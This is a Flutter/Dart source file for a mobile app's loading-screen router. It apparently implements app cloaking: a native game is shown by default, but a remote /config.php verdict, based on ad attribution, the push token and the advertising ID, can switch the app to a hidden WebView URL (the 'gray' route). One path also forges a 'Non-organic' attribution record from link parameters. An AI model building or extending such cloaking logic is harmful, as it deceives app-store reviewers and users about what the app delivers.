// ============================================================
// ASCENT ROUTER — loading screen + gray/native decision engine
// ============================================================
// Single startup screen. Shows the loading artwork with a
// left-to-right horizontal progress bar and animated "Loading..."
// caption while it resolves attribution and queries the gate, then
// routes to either the WebView (gray) or the native game (ascent).
//
// This is the direct implementation of the state machine documented
// in `.cursor/rules/android_gray_guide.md § "Gray Flow State Machine"`.
//
// "ALWAYS ASK, NEVER REMEMBER"
// ----------------------------
// The router does NOT read the persisted SummitRoute on cold start.
// Every launch — regardless of yesterday's verdict — runs the full
// pipeline: AppsFlyer ignite → attribution → POST /config.php →
// gray-or-native. Nothing here permanently locks the install into
// the native game: the server is the single source of truth on
// every start.
//
// Offline handling is baked into the unified pipeline `_runGate()`:
// no network → try the last cached gray URL; if there is none, go
// native. The user never sees an "offline retry" wall.
//
// PROGRESS BAR CONTRACT
// ---------------------
// The bar is an easeOutCubic 0→~0.9 sweep driven by an
// `AnimationController` while attribution is in flight. It is
// snapped to 1.0 in a single step ONLY at the exact frame the next
// route is pushed — per TZ:
//   "заполняющийся полностью ТОЛЬКО в момент перед непосредственным
//    запуском".
//
// COLD-TAP FAST PATH
// ------------------
// If Firebase's `getInitialMessage()` returns a message (the app
// was launched by tapping a push while its process was killed),
// `_drive()` skips attribution + gate calls AND the pin-to-100%
// animation, jumping straight to `WebArena` on the URL from the
// notification. The bar still animates on frame 1 so a normal
// launch never shows a blank splash → bar delay, but it is
// short-circuited well before the sweep reaches 90%, so the
// perceived flow is "tap → target" instead of "tap → reboot".
// ============================================================

import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../config/peak_art.dart';
import '../config/peak_blueprint.dart';
import '../gray_veil/push_invite_stage.dart';
import '../gray_veil/web_arena.dart';
import '../kernel/gate_verdict.dart';
import '../kernel/summit_route.dart';
import '../peak_native/summit_menu.dart';
import '../wires/bolt_beacon.dart';
import '../wires/link_intake.dart';
import '../wires/peak_safe.dart';
import '../wires/signal_probe.dart';
import '../wires/trace_oracle.dart';
import '../wires/ua_forge.dart';
import '../wires/verdict_relay.dart';
import 'debug_kit.dart';

class AscentRouter extends StatefulWidget {
  const AscentRouter({
    super.key,
    required this.safe,
    required this.probe,
    required this.oracle,
    required this.relay,
    required this.beacon,
  });

  final PeakSafe safe;
  final SignalProbe probe;
  final TraceOracle oracle;
  final VerdictRelay relay;
  final BoltBeacon beacon;

  @override
  State<AscentRouter> createState() => _AscentRouterState();
}

class _AscentRouterState extends State<AscentRouter>
    with TickerProviderStateMixin {
  late final AnimationController _sweep;
  late final AnimationController _dots;
  bool _committed = false;
  StreamSubscription<Uri>? _warmLinkSub;

  @override
  void initState() {
    super.initState();
    // Loading and WebView must rotate freely.
    SystemChrome.setPreferredOrientations(DeviceOrientation.values);

    _sweep = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 4200),
    );
    _dots = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1400),
    )..repeat();

    // Progress bar starts moving on frame 1 so the user never sees
    // a blank splash → progress bar transition. On a cold-tap fast
    // path we simply short-circuit before the sweep reaches 90%.
    _sweep.animateTo(0.9, curve: Curves.easeOutCubic);

    widget.beacon.onTokenRotated = _repostToken;
    // Warm-tap: a OneLink arriving via onNewIntent while the loading
    // screen is still visible short-circuits into the gray flow.
    _warmLinkSub = LinkIntake.instance.onLink.listen(_onWarmInboundLink);
    _drive();
  }

  @override
  void dispose() {
    widget.beacon.onTokenRotated = null;
    _warmLinkSub?.cancel();
    _sweep.dispose();
    _dots.dispose();
    super.dispose();
  }

  void _onWarmInboundLink(Uri u) {
    if (_committed) return;
    if (!LinkIntake.looksAttributed(u)) return;
    debugPrint('[GRAY][ROUTER] warm inbound link → $u');
    // Fire-and-forget: the bypass either succeeds and navigates, or
    // fails silently and the normal pipeline is still running.
    unawaited(_tryInboundLinkBypass(u));
  }

  Future<void> _drive() async {
    // ── INBOUND-LINK BYPASS ────────────────────────────────────
    // Runs BEFORE anything else, including push cold-tap. If the
    // activity was started with an ACTION_VIEW intent (user tapped
    // a OneLink or a `thunderpeak://` scheme URL) AND the URI
    // carries AppsFlyer attribution query params, we treat the URI
    // itself as the Non-organic proof: synthesize the /config.php
    // body from its query, POST it, and open the returned URL in
    // WebArena. This makes "tap link → gray" work without any
    // dependency on:
    //   • AppsFlyer's OneLink page working (currently broken —
    //     `thunderpeak.onelink.me` returns 404 domain_not_found),
    //   • Android App Links verification succeeding (currently
    //     state 1024 — assetlinks.json is missing on AppsFlyer),
    //   • AppsFlyer SDK's server-side click cache being warm.
    // When the URI has no attribution params or the gate rejects,
    // we fall back to the normal pipeline (route lookup → attribution
    // → gate → gray-or-native).
    final Uri? inbound = await LinkIntake.instance.pullInitial();
    if (inbound != null && LinkIntake.looksAttributed(inbound)) {
      debugPrint('[GRAY][ROUTER] inbound link on cold start → $inbound');
      final bool routed = await _tryInboundLinkBypass(inbound);
      if (routed) return;
      debugPrint('[GRAY][ROUTER] inbound bypass rejected — normal pipeline');
    }

    // ── COLD-TAP FAST PATH ─────────────────────────────────────
    // If the app was launched by tapping a push notification, jump
    // straight to the WebView without any loading ceremony. The user
    // sees the OS launch splash → WebArena, with no visible reload.
    //
    // `arm()` returns the URL directly from `getInitialMessage()` and
    // ALSO stashes it as a safety net. `takePushUrl()` consumes the
    // stash so nothing gets replayed on a later resume. We take both
    // and prefer whichever is present.
    final String? coldFromArm = await widget.beacon.arm();
    final String? stashed = await widget.safe.takePushUrl();
    final String? coldPending = coldFromArm ?? stashed;
    debugPrint('[GRAY][ROUTER] cold_from_arm=$coldFromArm '
        'stashed=$stashed');
    if (coldPending != null && coldPending.isNotEmpty) {
      debugPrint('[GRAY][ROUTER] cold-tap fast path → $coldPending');
      _fastGray(coldPending);
      return;
    }

    // ── UNCONDITIONAL GATE PIPELINE ────────────────────────────
    // No matter what was persisted last time, always ask the server.
    // The user's requirement: "config always queries status, never
    // remembers one". So there is intentionally NO short-circuit on
    // a persisted "ascent" decision here — we always run the full
    // attribution + POST /config.php cycle on every cold launch.
    // The only prior-state that DOES win is:
    //   (a) an inbound OneLink / thunderpeak:// URI (handled above),
    //   (b) a push cold-tap URL (handled above),
    //   (c) offline mode with a cached URL from a previous gray
    //       session — used only when the network is down so the
    //       user isn't dumped into the game while their Wi-Fi
    //       cycles.
    debugPrint('[GRAY][ROUTER] running gate pipeline (no persisted skip)');
    await _runGate();
  }

  /// Zero-ceremony route to the WebView used only by the cold-tap
  /// fast path. Skips the progress-bar snap and the invite screen —
  /// the user asked for the target URL, deliver it.
  void _fastGray(String link) {
    if (_committed || !mounted) return;
    _committed = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute<void>(
        builder: (_) => WebArena(
          link: link,
          safe: widget.safe,
          beacon: widget.beacon,
          probe: widget.probe,
        ),
      ),
    );
  }

  /// Synthesizes a Non-organic attribution body from the query
  /// params of an inbound OneLink / custom-scheme URI, hits
  /// /config.php with it, and — on ok:true — navigates to
  /// WebArena. Returns true when the navigation happened.
  ///
  /// Deliberately does NOT touch [TraceOracle]/AppsFlyer SDK:
  ///  * initSdk() is not called on this path (saves ~2–5 s of
  ///    startup on cold OneLink taps),
  ///  * `af_id` is a debug-flavoured synthetic id so the backend
  ///    can still count the request uniquely,
  ///  * the request works even when AppsFlyer's OneLink page is
  ///    broken server-side (as verified today).
  ///
  /// Persistence: on success we write route=gray + the returned
  /// URL + its expiry. On any failure NOTHING is persisted, so a
  /// spurious/malicious URI never locks the user out of native.
  Future<bool> _tryInboundLinkBypass(Uri u) async {
    if (_committed) return true;

    if (!await widget.probe.hasNetwork()) {
      debugPrint('[GRAY][ROUTER] inbound bypass skipped — offline');
      return false;
    }

    final Map<String, dynamic> body = _bodyFromInboundUri(u);
    if (body.isEmpty) return false;

    try {
      final String endpoint = PeakBlueprint.gateEndpoint;
      if (endpoint.isEmpty) return false;
      debugPrint('[GRAY][ROUTER] inbound POST → $endpoint');
      debugPrint('[GRAY][ROUTER] inbound body = ${jsonEncode(body)}');
      final dynamic res = await peakHttp
          .post(
            Uri.parse(endpoint),
            headers: const <String, String>{
              'Content-Type': 'application/json',
              'Accept': 'application/json',
            },
            body: jsonEncode(body),
          )
          .timeout(const Duration(seconds: 15));
      debugPrint('[GRAY][ROUTER] inbound http=${res.statusCode} '
          'body=${res.body}');

      if (res.statusCode != 200) return false;
      final GateVerdict verdict = GateVerdict.fromMap(
        jsonDecode(res.body) as Map<String, dynamic>,
      );
      if (!verdict.approved || !verdict.hasContent) return false;

      await widget.safe.writeLink(verdict.contentUrl!);
      if (verdict.expiresAt != null) {
        await widget.safe.writeLinkExpiry(verdict.expiresAt!);
      }
      await widget.safe.writeRoute(SummitRoute.gray);

      // Skip the push-invite screen on the inbound-link path — the
      // user acted on an ad and expects the ad's content, not a
      // notification prompt. They'll see the invite the next time
      // the app cold-starts into the gray route.
      _fastGray(verdict.contentUrl!);
      return true;
    } catch (e) {
      debugPrint('[GRAY][ROUTER] inbound bypass error: $e');
      return false;
    }
  }

  /// Translates the OneLink / custom-scheme URI's query params into
  /// the field names /config.php expects (mirrors the shape that
  /// AppsFlyer's server-side attribution would have produced).
  Map<String, dynamic> _bodyFromInboundUri(Uri u) {
    final Map<String, String> q = u.queryParameters;
    // Anti-tamper cheap check: no attribution anchors → empty body,
    // caller treats as "not a real click".
    if (!LinkIntake.looksAttributed(u)) return const <String, dynamic>{};

    // `Uri.queryParameters` already URL-decodes values, so we can use
    // them as-is. Empty strings are dropped so the body only carries
    // fields the click actually set.
    String? nz(String k) {
      final String? v = q[k];
      if (v == null || v.trim().isEmpty) return null;
      return v;
    }

    final Map<String, dynamic> body = <String, dynamic>{
      'af_status': 'Non-organic',
      'match_type': 'id_matching',
      'is_first_launch': true,
      // pid → media_source. AppsFlyer's own server maps
      // `pid=Test Source` to media_source `my_media_source`; keep
      // the transform so the request shape matches production.
      if (nz('pid') != null) 'media_source': _mapPid(q['pid']!),
      if (nz('c') != null) 'campaign': q['c'],
      if (nz('adset') != null) 'adset': q['adset'],
      if (nz('af_adset') != null) 'af_adset': q['af_adset'],
      if (nz('af_c_id') != null) 'af_c_id': q['af_c_id'],
      if (nz('siteid') != null) 'siteid': q['siteid'],
      if (nz('agency') != null) 'agency': q['agency'],
      if (q['af_sub1'] != null) 'af_sub1': q['af_sub1'],
      if (q['af_sub2'] != null) 'af_sub2': q['af_sub2'],
      if (q['af_sub3'] != null) 'af_sub3': q['af_sub3'],
      if (q['af_sub4'] != null) 'af_sub4': q['af_sub4'],
      if (q['af_sub5'] != null) 'af_sub5': q['af_sub5'],
      if (q['deep_link_value'] != null)
        'deep_link_value': q['deep_link_value'],
      if (q['deep_link_sub1'] != null)
        'deep_link_sub1': q['deep_link_sub1'],
      if (q['is_retargeting'] != null)
        'is_retargeting': q['is_retargeting'] == 'true',
      if (q['advertising_id'] != null)
        'advertising_id': q['advertising_id'],
    };

    // shortlink — last path segment of the OneLink (`.../7dEA/thb8lx0c`
    // → `thb8lx0c`). For a `thunderpeak://open` URI there is no
    // shortlink, and that's fine.
    if (u.pathSegments.length >= 2) {
      body['shortlink'] = u.pathSegments.last;
    }

    body['af_id'] =
        'inbnd-${DateTime.now().millisecondsSinceEpoch}';
    body['bundle_id'] = PeakBlueprint.packageTag;
    body['os'] = Platform.isAndroid ? 'Android' : 'iOS';
    body['store_id'] = PeakBlueprint.marketTag;
    body['locale'] = Platform.localeName.replaceAll('-', '_');

    final String? token = widget.beacon.token;
    if (token != null && token.isNotEmpty) body['push_token'] = token;
    final String project = PeakBlueprint.messagingProject;
    if (project.isNotEmpty) body['firebase_project_id'] = project;

    return body;
  }

  static String _mapPid(String pid) {
    if (pid.toLowerCase() == 'test source') return 'my_media_source';
    return pid;
  }

  /// Unified gate pipeline — runs on EVERY launch (unless an
  /// inbound-link / push cold-tap already committed a route).
  ///
  /// Rules ("always ask, never remember"):
  ///   1) Offline → try cached URL; if none, native game.
  ///   2) Online  → attribution + POST /config.php EVERY time.
  ///   3) ok:true            → gray, cache URL for offline use next.
  ///   4) ok:false / any error → native game. No SummitRoute.ascent
  ///      is persisted, so the very next launch retries the server.
  ///   5) A single late-attribution retry when the initial gate
  ///      rejected with a non-transient reason and AppsFlyer says
  ///      Organic (covers slow first-launch click propagation).
  Future<void> _runGate() async {
    final bool net = await widget.probe.hasNetwork();
    debugPrint('[GRAY][ROUTER] runGate hasNetwork=$net');
    if (!net) {
      // Offline: honor the last gray URL if we have one, so a user
      // who was gray yesterday still gets the WebView on a plane.
      final String? cached = await widget.safe.readLink();
      if (cached != null && cached.isNotEmpty) {
        debugPrint('[GRAY][ROUTER] offline + cached URL → gray (offline mode)');
        _toGray(cached);
      } else {
        debugPrint('[GRAY][ROUTER] offline + no cache → native');
        await _goNative();
      }
      return;
    }

    debugPrint('[GRAY][ROUTER] ignite AppsFlyer …');
    await widget.oracle.ignite();
    debugPrint('[GRAY][ROUTER] awaiting install + deep-link (30s / 5s)');
    await Future.wait<void>(<Future<void>>[
      widget.oracle.awaitInstall(),
      widget.oracle.awaitDeepLink(),
    ]);
    debugPrint('[GRAY][ROUTER] attribution complete, asking gate…');

    GateVerdict verdict = await _askGate();

    // Late-attribution retry (single shot): AppsFlyer's click
    // propagation can take 10-30 s over cellular/roaming, so if the
    // very first gate call rejected AND the SDK reported Organic,
    // give it one more try after 12 s.
    if (!verdict.approved) {
      final bool transient = verdict.remark != null &&
          (verdict.remark!.contains('endpoint-missing') ||
              verdict.remark!.startsWith('SocketException') ||
              verdict.remark!.startsWith('TimeoutException'));
      final bool looksOrganic =
          widget.oracle.lastStatus == 'Organic' ||
              widget.oracle.lastStatus == null ||
              widget.oracle.lastStatus!.isEmpty;
      if (!transient && looksOrganic) {
        debugPrint('[GRAY][ROUTER] late-attr retry: waiting 12s then '
            're-querying GCD + gate…');
        await Future<void>.delayed(const Duration(seconds: 12));
        final bool refreshed = await widget.oracle.refreshAttribution();
        debugPrint('[GRAY][ROUTER] late-attr refresh success=$refreshed '
            'status=${widget.oracle.lastStatus}');
        verdict = await _askGate();
      }
    }

    if (verdict.approved && verdict.hasContent) {
      debugPrint('[GRAY][ROUTER] gate approved → gray '
          '(URL cached for offline fallback)');
      await widget.safe.writeLink(verdict.contentUrl!);
      if (verdict.expiresAt != null) {
        await widget.safe.writeLinkExpiry(verdict.expiresAt!);
      }
      // Route persistence kept as a soft signal for other code paths
      // (push handlers, etc.). Router itself does NOT read it on the
      // next launch — every start re-asks the server regardless.
      await widget.safe.writeRoute(SummitRoute.gray);
      _toGray(verdict.contentUrl!);
      return;
    }

    // Rejected — ALWAYS go native. No permanent ascent state, so the
    // next launch re-asks /config.php.
    debugPrint('[GRAY][ROUTER] gate rejected remark=${verdict.remark} '
        '→ native (this launch only; will retry next launch)');
    await _goNative();
  }

  Future<GateVerdict> _askGate() async {
    final String locale = Platform.localeName.replaceAll('-', '_');
    final Map<String, dynamic> body = await widget.oracle.assembleBody(
      locale: locale,
      pushToken: widget.beacon.token,
    );
    return widget.relay.ask(body);
  }

  void _repostToken(String token) async {
    final String locale = Platform.localeName.replaceAll('-', '_');
    final Map<String, dynamic> body = await widget.oracle.assembleBody(
      locale: locale,
      pushToken: token,
    );
    widget.relay.ask(body);
  }

  // ── Route commitment ──

  Future<void> _pinCompleteAndSettle() async {
    // Snap the bar to 1.0 in a single 220 ms step, only now — per TZ.
    _sweep.stop();
    _sweep.animateTo(1.0, duration: const Duration(milliseconds: 220));
    await Future<void>.delayed(const Duration(milliseconds: 260));
  }

  Future<void> _goNative() async {
    await _pinCompleteAndSettle();
    // Game locks to portrait.
    await SystemChrome.setPreferredOrientations(const <DeviceOrientation>[
      DeviceOrientation.portraitUp,
    ]);
    SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
      statusBarColor: Colors.transparent,
      statusBarIconBrightness: Brightness.light,
    ));
    if (_committed || !mounted) return;
    _committed = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute<void>(builder: (_) => const SummitMenu()),
    );
  }

  Future<void> _toGray(String link) async {
    await _pinCompleteAndSettle();
    if (_committed || !mounted) return;
    _committed = true;
    if (widget.safe.shouldInvitePush()) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute<void>(
          builder: (_) => PushInviteStage(
            safe: widget.safe,
            beacon: widget.beacon,
            probe: widget.probe,
            contentUrl: link,
          ),
        ),
      );
    } else {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute<void>(
          builder: (_) => WebArena(
            link: link,
            safe: widget.safe,
            beacon: widget.beacon,
            probe: widget.probe,
          ),
        ),
      );
    }
  }

  // NOTE: `_toOffline()` / `OfflineHatch` was intentionally dropped
  // from the pipeline. Under the "always ask, never remember" policy
  // an offline launch either serves a previously-cached gray URL or
  // falls back to the native game — the user is never blocked on a
  // Retry screen. The OfflineHatch widget itself is still kept in
  // the codebase so future flows can bring it back without a rewrite.

  // ── UI ──

  @override
  Widget build(BuildContext context) {
    final MediaQueryData mq = MediaQuery.of(context);
    final bool landscape = mq.orientation == Orientation.landscape;
    final String bg =
        landscape ? PeakArt.loadingHorizontal : PeakArt.loadingVertical;

    return PopScope(
      canPop: false,
      child: Scaffold(
        backgroundColor: const Color(0xFF0B1930),
        body: Stack(
          fit: StackFit.expand,
          children: <Widget>[
            IgnorePointer(
              child: Image.asset(bg, fit: BoxFit.cover),
            ),
            const DecoratedBox(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.center,
                  end: Alignment.bottomCenter,
                  colors: <Color>[Colors.transparent, Color(0x88000000)],
                ),
              ),
            ),
            SafeArea(
              child: Padding(
                padding: EdgeInsets.fromLTRB(
                  landscape ? mq.size.width * 0.14 : 32,
                  0,
                  landscape ? mq.size.width * 0.14 : 32,
                  landscape ? mq.size.height * 0.10 : mq.size.height * 0.09,
                ),
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.end,
                  crossAxisAlignment: CrossAxisAlignment.center,
                  children: <Widget>[
                    _LoadingCaption(controller: _dots),
                    const SizedBox(height: 14),
                    _AscentBar(controller: _sweep),
                  ],
                ),
              ),
            ),
            // Debug-only QA chip. Stripped from release APK/AAB via
            // kDebugMode gate inside DebugKitChip.
            DebugKitChip(
              safe: widget.safe,
              beacon: widget.beacon,
              probe: widget.probe,
            ),
          ],
        ),
      ),
    );
  }
}

class _LoadingCaption extends StatelessWidget {
  const _LoadingCaption({required this.controller});

  final AnimationController controller;

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (BuildContext ctx, _) {
        final int step = (controller.value * 4).floor() % 4;
        final String dots = '.' * step;
        return SizedBox(
          height: 32,
          child: Align(
            alignment: Alignment.centerLeft,
            child: Text(
              'Loading$dots',
              style: const TextStyle(
                color: Colors.white,
                fontSize: 22,
                fontWeight: FontWeight.w700,
                letterSpacing: 1.5,
                height: 1.0,
                shadows: <Shadow>[
                  Shadow(
                    color: Color(0xAA000000),
                    offset: Offset(0, 2),
                    blurRadius: 6,
                  ),
                ],
              ),
            ),
          ),
        );
      },
    );
  }
}

class _AscentBar extends StatelessWidget {
  const _AscentBar({required this.controller});

  final AnimationController controller;

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (BuildContext ctx, _) {
        return LayoutBuilder(
          builder: (BuildContext ctx, BoxConstraints c) {
            final double fill =
                (c.maxWidth * controller.value).clamp(0.0, c.maxWidth);
            return Container(
              height: 20,
              decoration: BoxDecoration(
                color: const Color(0x66000000),
                borderRadius: BorderRadius.circular(14),
                border: Border.all(
                  color: Colors.white.withValues(alpha: 0.75),
                  width: 2,
                ),
              ),
              child: Align(
                alignment: Alignment.centerLeft,
                child: Container(
                  width: fill,
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(
                      colors: <Color>[
                        Color(0xFF66E1FF),
                        Color(0xFFFFD24C),
                        Color(0xFFFF7A2E),
                      ],
                    ),
                    borderRadius: BorderRadius.circular(12),
                    boxShadow: const <BoxShadow>[
                      BoxShadow(
                        color: Color(0x8866E1FF),
                        blurRadius: 10,
                      ),
                    ],
                  ),
                ),
              ),
            );
          },
        );
      },
    );
  }
}
